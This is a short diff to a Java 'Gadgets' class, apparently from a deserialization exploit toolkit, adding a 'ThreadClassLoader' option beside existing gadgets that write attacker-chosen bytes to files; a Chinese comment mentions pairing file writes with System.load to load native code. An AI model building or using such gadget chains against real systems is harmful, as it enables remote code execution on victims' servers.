@@ -160,6 +160,10 @@ public class Gadgets {
             className = "com.sun.org.apache.xml.internal.security.utils.JavaUtils";
             methodName = "writeBytesToFilename";
             parameters = new Object[]{split[1], destFileBytes};
+        } else if (parts[0].equals("ThreadClassLoader")) {
+            className = command.substring("ThreadClassLoader:".length());
+            methodName = "";
+            parameters = new Object[]{};
         } else {
             //还有 JavaUtils#writeBytesToFilename+System.load 和 DumpBytecode.dumpBytecode+System.load 但是比较麻烦先不整理了
             return null;
